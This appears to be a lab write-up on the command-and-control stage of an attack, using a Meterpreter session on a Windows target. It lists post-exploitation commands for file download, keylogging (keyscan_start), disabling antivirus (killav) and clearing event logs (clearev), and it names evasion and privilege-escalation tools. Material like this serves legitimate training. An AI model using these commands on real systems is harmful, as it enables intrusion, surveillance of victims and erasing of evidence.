# Command and Control (C2)

## Objective:
Establish a communication channel between the compromised system and the attacker's infrastructure to maintain control and issue commands.

## Action:
1. Establish the C2 Connection

    After successfully exploiting the target, we need to ensure a steady communication channel between the victim's machine and the attacker's system. This is crucial for issuing commands and exfiltrating data.

    One common way to establish this is through a **Meterpreter session**, which provides the attacker with full access to the compromised system. The attacker can now control the system remotely.

![image](https://github.com/user-attachments/assets/de00cdae-8ba3-4f14-85c2-a5f06524768d)

In the case of Meterpreter, once the victim executes the malicious payload, the attacker gains an interactive shell and can perform various actions, such as capturing screenshots, browsing the file system, or even turning on the victim’s webcam.

2. Gather Information from the Target System

In the C2 phase, it’s crucial to gather relevant information that will aid in planning further exploitation. The attacker can gather data on the operating system, network, user accounts, and files. Here are some useful Meterpreter commands:

- System Information

    Use the `sysinfo` command to gather details about the victim's operating system, architecture, and installed software:

```
sysinfo
```

- Network Enumeration
Collect network-related data using commands such as `ipconfig`, `arp`, and `route` to gather information about the victim’s IP, connected devices, and routing table:

```
ipconfig
arp -a
route print
```

- User Information
Extract user accounts and group memberships with `net user` and `net group` to identify accounts with elevated privileges:

```
net user
net group
```

- File System Exploration

    Explore the file system using `ls`, `cd`, and `download` commands to locate sensitive data that can be used for further exploitation:

```
ls
cd C:\Users\Bob\Documents
download sensitive_file.txt
```

![image](https://github.com/user-attachments/assets/91d73348-343b-48fe-ab28-99052de43b65)

- Screenshot and Keylogging

    Capture screenshots or log keystrokes to gather additional sensitive information:

```
screenshot
keyscan_start
```

3. Evade Detection (In this case we are not going to do it because Windows Defender for this lab is off, in the future you can active Windows Defender to do it)

    To avoid detection by security software and network monitoring systems, the attacker takes several evasion steps:

- Obfuscate Payloads

    Use tools like **Veil-Evasion** or **msfvenom** to obfuscate payloads and avoid detection by antivirus programs.

- Disable Security Tools

    Disable any antivirus programs running on the victim’s system using the `killav` command in Meterpreter:

```
killav
```
- Clear Logs

    Use the `clearev` command to clear event logs, erasing traces of the attack:

```
clearev
```
- Encrypt Communication

    Ensure that C2 traffic is encrypted to evade detection by network monitoring tools.

4. Privilege Escalation Preparation

    Escalating privileges is crucial for achieving full control over the system and accessing more sensitive data. This allows the attacker to execute commands that require administrative access.

    At this stage, the attacker navigates the system to gather sensitive information or stored passwords that could assist in escalating privileges. However, since the attacker is likely operating with low privileges at this point, this step is critical.

To check the current user privileges, the attacker can run the following command:
```
whoami
```
This command shows the user’s current permissions. If the attacker sees a standard user, they will know they need to escalate their privileges before moving forward.

5. Next Step: System Enumeration with WinPEAS

    After confirming the low-privilege status, the next step is to perform system enumeration. This helps identify potential vulnerabilities or misconfigurations that could allow privilege escalation.

The powerful WinPEAS tool can be used for this purpose. It can scan the system for potential privilege escalation opportunities, such as insecure permissions or unpatched vulnerabilities.

To run **WinPEAS**, the attacker would execute it on the compromised system. The output will highlight any potential escalation vectors the attacker could exploit.

# Conclusion

Before moving to the Actions on Objectives phase, the attacker ensures they have:

- **Persistence**: Multiple ways to regain access to the system, even after reboots or detection attempts.
- **Privileges**: Elevated access, such as administrator or SYSTEM-level, allowing the attacker to perform more impactful actions.
- **Information**: A clear understanding of the environment, including user details, system setup, and network architecture.
- **Evasion**: Techniques in place to avoid detection by security tools, including antivirus software and IDS systems.


